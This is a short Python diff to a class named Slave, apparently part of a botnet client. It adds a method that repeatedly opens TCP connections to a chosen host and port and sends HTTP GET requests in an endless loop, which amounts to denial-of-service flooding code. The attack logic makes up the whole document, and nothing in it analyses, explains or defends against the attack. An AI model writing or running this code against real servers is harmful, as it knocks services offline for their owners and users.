@@ -29,10 +29,14 @@ class Slave():
         if len(msg_buf) > 0:
           print(msg_buf)
 
-    def dos(self):
+    def doTheDos(self, host, port):
+        while 1:
+            self.dos(host, port)
+
+    def dos(self, host, port):
         try:
             self.ddos = socket(AF_INET, SOCK_STREAM)
-            self.ddos.connect((self.host, self.port))
+            self.ddos.connect((host, port))
             self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
         except error, msg:
             self.num_connections = self.num_connections+1
